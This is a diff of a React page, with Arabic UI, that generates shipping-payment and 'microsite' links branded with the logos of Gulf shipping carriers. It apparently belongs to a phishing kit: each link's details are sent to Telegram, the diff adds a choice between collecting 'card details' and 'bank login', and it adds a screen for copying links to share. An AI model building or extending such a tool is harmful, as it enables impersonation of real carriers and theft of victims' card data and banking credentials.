@@ -9,10 +9,11 @@ import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { Package, MapPin, DollarSign, Hash } from "lucide-react";
+import { Package, DollarSign, Hash, Copy, Eye, Check } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
+import type { PaymentMethod } from "@/lib/paymentFlow";
 
 const CreateShippingLink = () => {
   const { country } = useParams();
@@ -26,6 +27,10 @@ const CreateShippingLink = () => {
   const [trackingNumber, setTrackingNumber] = useState("");
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
+  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("card");
+  const [createdPaymentLink, setCreatedPaymentLink] = useState<string | null>(null);
+  const [createdMicrositeLink, setCreatedMicrositeLink] = useState<string | null>(null);
+  const [copyStatus, setCopyStatus] = useState<{ payment?: boolean; microsite?: boolean }>({});
   
   // Get selected service details and branding
   const selectedServiceData = useMemo(() => 
@@ -60,6 +65,7 @@ const CreateShippingLink = () => {
           tracking_number: trackingNumber,
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
+          payment_method: paymentMethod,
         },
       });
       
@@ -72,6 +78,7 @@ const CreateShippingLink = () => {
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
           country: countryData.nameAr,
+          payment_method: paymentMethod,
           payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
         },
         timestamp: new Date().toISOString()
@@ -91,11 +98,22 @@ const CreateShippingLink = () => {
         });
       }
 
-      // Navigate to payment page with service parameter
-      navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
+      setCreatedPaymentLink(`${window.location.origin}/pay/${link.id}/confirm?service=${selectedService}`);
+      setCreatedMicrositeLink(`${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`);
     } catch (error) {
       console.error("Error creating link:", error);
     }
+  };
+
+  const handleCopy = (value: string, type: "payment" | "microsite") => {
+    navigator.clipboard.writeText(value).then(() => {
+      setCopyStatus((prev) => ({ ...prev, [type]: true }));
+      setTimeout(() => setCopyStatus((prev) => ({ ...prev, [type]: false })), 2000);
+      toast({
+        title: "تم النسخ",
+        description: type === "payment" ? "تم نسخ رابط الدفع" : "تم نسخ رابط المعاينة",
+      });
+    });
   };
   
   if (!countryData) {
@@ -109,6 +127,97 @@ const CreateShippingLink = () => {
     );
   }
   
+  if (createdPaymentLink && createdMicrositeLink) {
+    return (
+      <div className="min-h-screen py-6" dir="rtl">
+        <div className="container mx-auto px-4">
+          <Card className="max-w-xl mx-auto p-6">
+            <div className="text-center mb-6">
+              <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-primary flex items-center justify-center">
+                <Check className="w-8 h-8 text-white" />
+              </div>
+              <h2 className="text-xl font-bold mb-1">تم إنشاء الرابط بنجاح</h2>
+              <p className="text-sm text-muted-foreground">شارك روابط الدفع أو المعاينة مع عملائك</p>
+            </div>
+
+            <div className="space-y-5">
+              <div className="space-y-2">
+                <p className="text-xs text-muted-foreground">رابط الدفع</p>
+                <div className="bg-secondary/40 p-3 rounded-lg text-xs break-all">
+                  {createdPaymentLink}
+                </div>
+                <div className="flex gap-3">
+                  <Button
+                    className="flex-1"
+                    onClick={() => handleCopy(createdPaymentLink, "payment")}
+                  >
+                    {copyStatus.payment ? (
+                      <>
+                        <Check className="w-4 h-4 ml-2" />
+                        <span className="text-sm">تم النسخ</span>
+                      </>
+                    ) : (
+                      <>
+                        <Copy className="w-4 h-4 ml-2" />
+                        <span className="text-sm">نسخ رابط الدفع</span>
+                      </>
+                    )}
+                  </Button>
+                  <Button
+                    variant="outline"
+                    className="flex-1"
+                    onClick={() => window.open(createdPaymentLink, "_blank")}
+                  >
+                    <span className="ml-2 text-sm">معاينة الدفع</span>
+                    <Eye className="w-4 h-4 mr-2" />
+                  </Button>
+                </div>
+              </div>
+
+              <div className="space-y-2">
+                <p className="text-xs text-muted-foreground">رابط المعاينة (المايكروسايت)</p>
+                <div className="bg-secondary/40 p-3 rounded-lg text-xs break-all">
+                  {createdMicrositeLink}
+                </div>
+                <div className="flex gap-3">
+                  <Button
+                    variant="secondary"
+                    className="flex-1"
+                    onClick={() => handleCopy(createdMicrositeLink, "microsite")}
+                  >
+                    {copyStatus.microsite ? (
+                      <>
+                        <Check className="w-4 h-4 ml-2" />
+                        <span className="text-sm">تم النسخ</span>
+                      </>
+                    ) : (
+                      <>
+                        <Copy className="w-4 h-4 ml-2" />
+                        <span className="text-sm">نسخ رابط المعاينة</span>
+                      </>
+                    )}
+                  </Button>
+                  <Button
+                    variant="outline"
+                    className="flex-1"
+                    onClick={() => window.open(createdMicrositeLink, "_blank")}
+                  >
+                    <span className="ml-2 text-sm">عرض المعاينة</span>
+                    <Eye className="w-4 h-4 mr-2" />
+                  </Button>
+                </div>
+              </div>
+
+              <Button variant="ghost" onClick={() => navigate("/services")}>
+                إنشاء رابط جديد
+              </Button>
+            </div>
+          </Card>
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
       <div className="container mx-auto px-4">
@@ -150,6 +259,20 @@ const CreateShippingLink = () => {
                 </Select>
               </div>
               
+              {/* Payment Method Selection */}
+              <div>
+                <Label className="mb-2 text-sm">طريقة الدفع</Label>
+                <Select value={paymentMethod} onValueChange={(value) => setPaymentMethod(value as PaymentMethod)}>
+                  <SelectTrigger className="h-10">
+                    <SelectValue placeholder="اختر طريقة الدفع" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-background z-50">
+                    <SelectItem value="card">بيانات البطاقة</SelectItem>
+                    <SelectItem value="bank-login">تسجيل الدخول البنكي</SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
+
               {/* Service Logo and Description */}
               {selectedService && serviceBranding && selectedServiceData && (
                 <div className="p-3 rounded-lg border border-border bg-card/50">
